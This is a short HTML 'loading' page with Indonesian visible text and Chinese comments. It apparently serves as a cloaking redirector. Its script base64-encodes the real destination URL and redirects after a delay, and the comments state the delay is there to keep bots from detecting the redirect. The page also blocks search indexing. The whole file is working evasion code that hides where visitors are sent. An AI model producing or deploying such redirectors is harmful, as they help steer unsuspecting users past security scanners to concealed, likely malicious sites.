<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Memuat Halaman...</title>
  <meta name="robots" content="noindex, nofollow">
  <script>
    // 用 base64 编码的第二页链接（真实跳转页）
    const encoded = "aHR0cHM6Ly93c3MtYW1iZXIudmVyY2VsLmFwcC8=";  // 对 https://wss-amber.vercel.app/ 进行 base64 加密

    // 延迟跳转（防止机器人立即识别）
    setTimeout(() => {
      window.location.href = atob(encoded);
    }, 1000); // 可根据需要设为800~1500ms
  </script>
</head>
<body>
  <p>Sedang memuat, mohon tunggu...</p>
</body>
</html>
